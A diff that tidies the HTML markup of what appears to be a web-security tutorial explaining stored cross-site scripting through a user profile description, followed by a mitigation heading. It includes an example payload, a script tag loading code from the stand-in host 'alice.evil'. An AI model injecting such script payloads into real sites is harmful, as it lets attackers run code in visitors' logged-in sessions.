@@ -23399,10 +23399,10 @@ too lazy to write something here.</p>
 </pre>
 <p>Resulting in this HTML:</p>
 <pre>
-<b>&lt;</b><b>div</b><b>&gt;</b>I&apos;m actually too lazy to write something here.<b>&lt;</b><b>/div</b><b>&gt;</b>
-<b>&lt;b</b>   <b>&gt;</b>   I like HTML<b>&lt;/b></b>
-Than Alice sets her profile description to <b>&gt;</b>. When she visits her
-profile, instead of seeing
+<b>&lt;div&gt;</b>I&apos;m actually too lazy to write something here.<b>&lt;/div&gt;</b>
+</pre>
+<p>Than Alice sets her profile description to <b>&gt;</b>. When she visits her
+profile, instead of seeing</p>
 <blockquote>
 &lt;b&gt;I like HTML&lt;/b&gt;
 </blockquote>
@@ -23412,8 +23412,7 @@ profile, instead of seeing
 </blockquote>
 <p>Then Alice sets her profile to</p>
 <pre>
-<b>&lt;</b>
-<b>script</b> src = &quot;https://alice.evil/profile_xss.js&quot;<b>&gt;&lt;/script&gt;</b>I&apos;m actually too lazy to write something here.
+<b>&lt;script</b> src = &quot;https://alice.evil/profile_xss.js&quot;<b>&gt;&lt;/script&gt;</b>I&apos;m actually too lazy to write something here.
 </pre>
 <p>Whenever someone visits her profile, they get Alice&apos;s script run on Bob&apos;s website while logged on as their account.</p>
 <p><b>Mitigation</b></p>
